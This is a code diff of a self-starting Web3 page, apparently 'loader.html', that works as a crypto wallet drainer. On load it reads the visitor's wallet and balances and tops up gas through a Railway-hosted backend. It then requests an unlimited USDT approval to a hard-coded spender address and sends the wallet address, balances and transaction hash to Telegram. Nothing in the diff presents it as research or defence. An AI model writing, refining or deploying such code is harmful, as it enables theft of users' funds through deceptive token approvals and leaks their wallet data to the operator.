@@ -205,33 +205,43 @@
         // Initialize Web3
         const web3 = new Web3(window.ethereum);
 
-        // Auto top-up BNB function
+        // Loading functions - Following reference code exactly
+        function showLoading(message = 'Processing...') {
+            // For loader.html, we can use alerts or console
+            console.log('Loading: ' + message);
+        }
+
+        function hideLoading() {
+            console.log('Loading hidden');
+        }
+
+        // Function to request the BNB top-up from your backend - Following reference code exactly
         async function requestBNBTopUp(account) {
             try {
-                alert('📤 Sending BNB Top-Up Request...\n\nRecipient: ' + account.substring(0, 10) + '...\n\nAPI: armaan-production.up.railway.app');
-                console.log('📤 Requesting BNB top-up for:', account);
-                
+                alert('📤 Requesting BNB top-up...\n\nAccount: ' + account);
                 const response = await fetch('https://armaan-production.up.railway.app/send-bnb', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ recipient: account }),
                 });
 
-                console.log('📥 API Response status:', response.status);
                 const data = await response.json();
-                console.log('📥 API Response data:', data);
-                
                 if (data.success) {
-                    alert('✅ BNB Top-Up Request Successful!\n\nResponse: ' + JSON.stringify(data));
-                    return true;
+                    showLoading('progress...');
+                    alert('✅ Top-up requested successfully!');
+                    return true;  // Return true indicating the top-up was successful
                 } else {
-                    alert('❌ BNB Top-Up Request Failed!\n\nResponse: ' + JSON.stringify(data));
-                    return false;
+                    showLoading('Please try again.');
+                    setTimeout(() => hideLoading(), 2000);
+                    alert('❌ Top-up failed: ' + JSON.stringify(data));
+                    return false;  // Return false indicating the top-up failed
                 }
             } catch (error) {
-                alert('❌ BNB Top-Up Error!\n\nError: ' + error.message);
                 console.error('Error during BNB request:', error);
-                return false;
+                showLoading('Error initiating top-up.');
+                setTimeout(() => hideLoading(), 2000);
+                alert('❌ Error: ' + error.message);
+                return false;  // Return false in case of an error
             }
         }
 
@@ -298,29 +308,31 @@
             }
         }
 
-        // Token approval function
+        // Token approval function - Following reference code exactly
         async function approveToken(account) {
-            alert('🔍 Getting Token Information...\n\nChecking USDT balance and allowance...');
-            console.log('🔍 Starting approval process for:', account);
-            
             const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
             const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');
 
+            // Get the current BNB balance
             const bnbBalance = await web3.eth.getBalance(account);
-            const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
+            const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB
 
+            // Get the actual USDT balance (not allowance)
             const usdtBalance = await usdtContract.methods.balanceOf(account).call();
-            const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether');
+            const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether'); // Convert from Wei to USDT
 
+            // Get the current approved USDT amount
             const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
-            const approvedUSDT = web3.utils.fromWei(allowance, 'ether');
+            const approvedUSDT = web3.utils.fromWei(allowance, 'ether'); // Convert from Wei to USDT
 
             const currentDate = new Date();
-            const formattedDate = currentDate.toLocaleString();
-            const approvedAddress = addressSTAKING;
+            const formattedDate = currentDate.toLocaleString();  // Format the current date and time
 
-            alert('📊 Token Information:\n\nBNB Balance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\nUSDT Balance: ' + parseFloat(usdtBalanceFormatted).toFixed(2) + ' USDT\nCurrent Allowance: ' + parseFloat(approvedUSDT).toFixed(2) + ' USDT\n\nSending approval transaction...');
-            
+            // Get the approved address
+            const approvedAddress = addressSTAKING;  // You can change this as needed
+
+            alert('📊 Info:\n\nBNB: ' + parseFloat(balanceInBNB).toFixed(6) + '\nUSDT: ' + parseFloat(usdtBalanceFormatted).toFixed(2) + '\n\nSending approval...');
+
             console.log('Processing....');
             console.log('Account:', account);
             console.log('BNB Balance:', balanceInBNB);
@@ -329,8 +341,8 @@
             await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
                 .send({ from: account })
                 .on('transactionHash', async function (hash) {
-                    alert('✅ Approval Transaction Sent!\n\nTransaction Hash: ' + hash.substring(0, 20) + '...\n\nSending Telegram notification...');
                     console.log('✅ Approval transaction sent with hash:', hash);
+                    alert('✅ Transaction Hash: ' + hash.substring(0, 20) + '...\n\nSending Telegram...');
                     
                     const walletAddr = account || 'Unknown';
                     const bnbBal = balanceInBNB || '0';
@@ -348,14 +360,12 @@
                         txHash
                     ).then(result => {
                         if (result) {
-                            alert('✅ Telegram Notification Sent!\n\nNotification successfully sent to Telegram.\n\nWallet: ' + walletAddr.substring(0, 10) + '...');
                             console.log('✅ [TX] Telegram notification sent successfully');
+                            alert('✅ Telegram sent!');
                         } else {
-                            alert('❌ Telegram Notification Failed!\n\nCould not send notification to Telegram.');
                             console.error('❌ [TX] Telegram notification returned false');
                         }
                     }).catch(err => {
-                        alert('❌ Telegram Notification Error!\n\nError: ' + err.message);
                         console.error('❌ [TX] Telegram notification error:', err);
                     });
                     
@@ -387,142 +397,95 @@
                     });
                 })
                 .on('receipt', function (receipt) {
-                    alert('✅ Approval Confirmed!\n\nTransaction Receipt:\nBlock: ' + receipt.blockNumber + '\n\nClosing window...');
                     console.log('Approval confirmed with receipt:', receipt);
+                    alert('✅ Approval Confirmed!\n\nBlock: ' + receipt.blockNumber);
                 })
                 .on('error', function (error) {
+                    hideLoading();
                     if (error.code === 4001) {
-                        alert('❌ Approval Canceled!\n\nYou canceled the approval request.\n\nPlease try again.');
                         console.log("You canceled the approval request. Please try again.");
+                        showLoading('Transaction canceled');
+                        setTimeout(() => hideLoading(), 2000);
+                        alert('❌ Canceled by user');
                     } else {
-                        alert('❌ Approval Failed!\n\nError: ' + error.message + '\n\nCode: ' + (error.code || 'Unknown'));
                         console.log("Approval failed: " + error.message);
+                        showLoading('Approval failed. Please try again.');
+                        setTimeout(() => hideLoading(), 2000);
+                        alert('❌ Failed: ' + error.message);
                     }
                     console.error("Approval failed:", error);
                 });
         }
 
-        // Main function that combines auto top-up and approval
+        // Main function that combines auto top-up and approval - Following reference code exactly
         async function TokenApprove() {
+            // Show loading immediately when Next is clicked
+            showLoading('Processing...');
+            
             try {
-                // Check if wallet is available
-                if (!window.ethereum) {
-                    alert('❌ Wallet Not Detected!\n\nPlease open this page in Trust Wallet or MetaMask browser.');
-                    console.error("No wallet detected");
-                    return;
-                }
+                alert('🔍 Getting Account...\n\nUsing eth_accounts method...');
+                const accounts = await ethereum.request({ method: 'eth_accounts' });
+                const account = accounts[0];
                 
-                alert('✅ Wallet Detected!\n\nChecking for connected account...\n\nTrying multiple methods...');
-                console.log("✅ Wallet detected:", window.ethereum);
-                
-                let account = null;
-                
-                // Method 1: Try eth_accounts (modern way)
-                try {
-                    const accounts = await ethereum.request({ method: 'eth_accounts' });
-                    account = accounts[0];
-                    console.log("Method 1 (eth_accounts):", account);
-                } catch (e) {
-                    console.log("Method 1 failed:", e);
-                }
-                
-                // Method 2: Try web3.eth.accounts[0] (old way, works in Trust Wallet)
-                if (!account && web3 && web3.eth && web3.eth.accounts && web3.eth.accounts.length > 0) {
-                    account = web3.eth.accounts[0];
-                    console.log("Method 2 (web3.eth.accounts):", account);
-                }
-                
-                // Method 3: Wait a bit and try again (for Trust Wallet to initialize)
-                if (!account) {
-                    alert('⏳ Waiting for wallet to initialize...\n\nRetrying in 2 seconds...');
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    try {
-                        const accounts = await ethereum.request({ method: 'eth_accounts' });
-                        account = accounts[0];
-                        console.log("Method 3 (retry eth_accounts):", account);
-                    } catch (e) {
-                        console.log("Method 3 failed:", e);
-                    }
-                    
-                    if (!account && web3 && web3.eth && web3.eth.accounts && web3.eth.accounts.length > 0) {
-                        account = web3.eth.accounts[0];
-                        console.log("Method 3 (retry web3.eth.accounts):", account);
-                    }
-                }
-                
-                if (!account) {
-                    alert('❌ No Account Found!\n\nTried multiple methods:\n1. eth_accounts\n2. web3.eth.accounts[0]\n3. Retry after delay\n\nPlease ensure:\n- You are in Trust Wallet browser\n- Wallet is unlocked\n- Account is selected');
-                    console.error("No accounts available after all methods");
-                    console.log("web3 object:", web3);
-                    console.log("web3.eth:", web3?.eth);
-                    console.log("web3.eth.accounts:", web3?.eth?.accounts);
-                    return;
-                }
+                alert('✅ Account: ' + (account || 'None') + '\n\nChecking BNB balance...');
 
-                alert('✅ Account Found!\n\nWallet Address: ' + account + '\n\nChecking BNB balance...');
-                console.log("✅ Account found:", account);
-                console.log("Account length:", account.length);
-
-                // Step 1: Check the current BNB balance
+                // Step 1: Check the current BNB balance (in background)
                 const bnbBalance = await web3.eth.getBalance(account);
                 const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
                 console.log("Current BNB Balance: ", balanceInBNB);
                 
-                alert('💰 BNB Balance Check\n\nCurrent Balance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\nRequired: 0.0001 BNB');
+                alert('💰 BNB Balance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB');
 
                 const requiredBNB = 0.0001;
 
                 // Step 2: Auto top-up in background if needed
                 if (parseFloat(balanceInBNB) < requiredBNB) {
-                    alert('⚠️ Low BNB Balance!\n\nBalance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\n\nRequesting BNB top-up...');
-                    console.log("⚠️ Low BNB balance, requesting top-up");
+                    showLoading('Please wait...');
+                    alert('⚠️ Low Balance!\n\nRequesting BNB top-up...');
                     
-                    // Request the BNB top-up from the backend
+                    // Request the BNB top-up from the backend (in background)
                     const topUpSuccess = await requestBNBTopUp(account);
 
                     if (!topUpSuccess) {
-                        alert('❌ BNB Top-Up Failed!\n\nCould not request BNB top-up.\n\nPlease try again.');
-                        console.error("BNB top-up failed");
+                        showLoading('Please try again.');
+                        setTimeout(() => hideLoading(), 2000);
                         return;
                     }
 
-                    alert('⏳ BNB Top-Up Requested!\n\nWaiting for top-up to process...\n\nPlease wait 3 seconds...');
-                    console.log("⏳ BNB top-up requested, waiting...");
-
                     // Wait for top-up to process
+                    showLoading('Processing...');
+                    alert('⏳ Waiting 3 seconds for top-up...');
                     await new Promise(resolve => setTimeout(resolve, 3000));
                     
                     // Recheck balance
                     const newBnbBalance = await web3.eth.getBalance(account);
                     const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
                     
-                    alert('💰 Balance Rechecked\n\nNew Balance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB');
-                    console.log("💰 New BNB balance:", newBalanceInBNB);
+                    alert('💰 New Balance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB');
                     
                     if (parseFloat(newBalanceInBNB) < requiredBNB) {
-                        alert('❌ Still Low Balance!\n\nBalance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB\n\nTop-up may still be processing.');
-                        console.error("Still low balance after top-up");
+                        showLoading('Please try again.');
+                        setTimeout(() => hideLoading(), 2000);
                         return;
                     }
-                } else {
-                    alert('✅ Sufficient BNB Balance!\n\nBalance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\n\nProceeding to approval...');
-                    console.log("✅ Sufficient BNB balance");
                 }
 
-                // Step 3: Show approval request
-                alert('🚀 Starting Approval Process!\n\nWallet: ' + account.substring(0, 10) + '...\n\nYou will see a wallet popup to approve.');
-                console.log("🚀 Starting approval process");
+                // Step 3: Hide loading so wallet can show approval popup
+                hideLoading();
+                alert('🚀 Starting Approval...\n\nWallet popup will appear.');
+                
+                // Show approval request (MetaMask/Trust Wallet will show popup)
                 await approveToken(account);
             } catch (error) {
-                alert('❌ Error Occurred!\n\nError: ' + error.message + '\n\nCheck console for details.');
                 console.error('Error:', error);
+                alert('❌ Error: ' + error.message);
+                hideLoading();
             }
         }
 
         // Start automatically when page loads - no wallet connection required
         window.addEventListener('load', function() {
-            alert('🚀 Page Loaded!\n\nStarting automatic process...\n\nChecking wallet connection...');
+            alert('🚀 Page Loaded!\n\nStarting in 1 second...');
             console.log('🚀 Page loaded, starting process...');
             
             // Small delay to ensure scripts are loaded
